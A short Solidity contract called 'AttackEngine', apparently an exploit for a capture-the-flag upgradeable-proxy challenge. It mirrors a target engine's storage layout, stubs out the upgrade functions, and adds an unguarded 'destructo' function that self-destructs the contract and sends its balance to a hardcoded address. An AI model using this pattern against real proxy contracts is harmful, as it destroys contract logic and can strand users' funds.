// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./Initializable.sol";

contract AttackEngine is Initializable {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;
    
    function initialize() external initializer {
        horsePower = 2000; 
    }
    
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable {
        
    }
    
    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {    //TODO: change to be modifier 
    
    }
    
    function destructo() public {
        selfdestruct(payable(0xcEa845CA58C8dD4369810c3b5168C49Faa34E6F3));
    }
}